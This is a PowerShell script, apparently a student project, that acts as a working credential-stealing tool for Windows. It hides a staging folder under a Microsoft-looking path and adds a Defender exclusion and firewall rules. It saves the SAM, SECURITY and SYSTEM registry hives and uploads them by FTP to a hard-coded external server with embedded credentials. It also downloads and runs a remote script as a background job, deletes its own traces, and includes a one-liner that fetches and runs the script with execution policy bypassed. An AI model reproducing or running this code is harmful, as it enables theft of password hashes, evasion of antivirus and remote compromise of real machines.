$message = @"
=================================
    CHOOSE ACTIONS:
    0 - Exit and self-destruct
    1 - Export hashes
    2 - 
    3 - 
    4 - PC(not in)Control
=================================
"@;

$hostname = (hostname); # get hostname

$privBack = (whoami /priv | findstr "Backup"); # Read privilege to all files
$privRest = (whoami /priv | findstr "Restore"); # Write privilege to all files
$privOwn = (whoami /priv | findstr "Ownership"); # chmod privileges to all files

if(($privBack -eq $null) -or ($privRest -eq $null) -or ($privOwn -eq $null)) # Check privileges
{
    echo "NOT ENOUGH PRIVILEGES"
    Exit;
}
else # Create sandbox folder
{
    echo "Creating environment";
    rm -r -fo "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue';

    md "C:\Program Files\Common Files\Microsoft" >$null;
    icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F >$null;
    Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft' >$null;
    
    echo "Setting up Firewall";
    New-NetFirewallRule -DisplayName "FTP-in"  -Direction Inbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
    New-NetFirewallRule -DisplayName "FTP-out"  -Direction Outbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
}

function choose() # Switch function
{
    echo $message

    $choice = Read-Host -Prompt "Your choice";

    Switch($choice)
    {
        0 {destruct;}
        1 {exportHashes;}
        2 {Exit;}
        3 {Exit;}
        4 {pcControl;}
    }
}

function destruct() # 0 - Exit and self-destruct
{
    rm -r -fo "C:\Program Files\Common Files\Microsoft";
    rm -fo ".\run.ps1";
    Exit;
}

function exportHashes() # 1 - Export hashes
{
    #----------------------------------------------SAVE HASHES-----------------------------------------------

    md "C:\Program Files\Common Files\Microsoft\$hostname";
    reg.exe save hklm\sam "C:\Program Files\Common Files\Microsoft\$hostname\sam.save";
    reg.exe save hklm\security "C:\Program Files\Common Files\Microsoft\$hostname\security.save";
    reg.exe save hklm\system "C:\Program Files\Common Files\Microsoft\$hostname\system.save";

    #----------------------------------------------CREATE FOLDER-----------------------------------------------

    $ftpdir = [System.Net.FtpWebRequest]::Create("ftp://hashes:123passnext321@5.182.17.134//PCs/$hostname");
    $ftpdir.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
    $ftpdir.UseBinary = $true

    $response = $ftpdir.GetResponse();

    echo $response.StatusDescription;

    $response.Close();

    #----------------------------------------------UPLOAD HASHES-----------------------------------------------

    $source = "C:\Program Files\Common Files\Microsoft\$hostname";
    $destination = "ftp://hashes:123passnext321@5.182.17.134//PCs/$hostname";

    $webclient = New-Object -TypeName System.Net.WebClient;

    $files = Get-ChildItem $source;

    foreach ($file in $files) {
        echo "Uploading $file";
        $webclient.UploadFile("$destination/$file", $file.FullName);
    } 

    $webclient.Dispose();

    choose;
}

function pcControl() # 4 - PC(not in)Control
{
    wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/NoPcControl.ps1 -outfile "C:\Program Files\Common Files\Microsoft\NoPcControl.ps1";
    Start-Job -FilePath "C:\Program Files\Common Files\Microsoft\NoPcControl.ps1" >$null;
    echo "Running as Background Job";
    choose;
}

choose;

#powershell -ExecutionPolicy Bypass -File .\run.ps1
#powershell wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/run.ps1 -outfile run.ps1; powershell -ExecutionPolicy Bypass -File .\run.ps1
